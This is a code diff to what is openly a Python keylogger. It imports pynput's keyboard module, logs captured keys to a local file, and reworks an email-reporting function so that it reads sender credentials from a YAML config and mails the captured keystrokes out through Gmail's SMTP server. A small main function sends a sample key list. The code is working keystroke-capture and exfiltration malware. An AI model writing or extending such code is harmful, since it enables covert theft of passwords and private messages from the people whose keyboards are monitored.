@@ -3,6 +3,10 @@ from os.path import exists
 from pynput.keyboard import Key
 
 import smtplib, ssl
+from email.message import EmailMessage
+
+import yaml
+
 
 def report_to_file(keys: List, file_name='log.txt'):
     """Reports keys to local file."""
@@ -30,31 +34,40 @@ def report_to_file(keys: List, file_name='log.txt'):
                 f_obj.write(k)
 
 
-def report_with_email(keys: List, config_file: str) -> None:
+def report_with_email(keys: List, config_file: str=None) -> None:
     """Use email as the reporting method."""
-    # Create message
-    message = f"""
-              Subject: log
-              {keys}
-              """
 
     # Read config data from file
-    with open(config_file, "r") as cnfg_file:
-        sender_email = ''
-        receiver_email = ''
-        password = ''
-        port = ''
+    with open("config.yaml", "r") as yaml_file:
+        cfg_file = yaml.safe_load(yaml_file)
+
+        sender_email = cfg_file['email']['sender_email']
+        receiver_email = cfg_file['email']['receiver_email']
+        password = cfg_file['email']['password']
+        port = cfg_file['email']['port']
+
+
+    # Construct the message
+    message = EmailMessage()
+    message.set_content(f"{keys}")
+
+    message['Subject'] = 'logs'
+    message['From'] = sender_email
+    message['To'] = receiver_email
 
     # Establish connection and send mail
     context = ssl.create_default_context()
     with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
         server.login(sender_email, password)
 
-        server.sendmail(sender_email, receiver_email, message)
+        server.send_message(message)
 
 
+def main():
+    message = ["s", "o", "m", "e", " ", "T", "e", "x", "c"]
+
+    report_with_email(message)
 
 
-
-
-
+if __name__ == '__main__':
+    main()
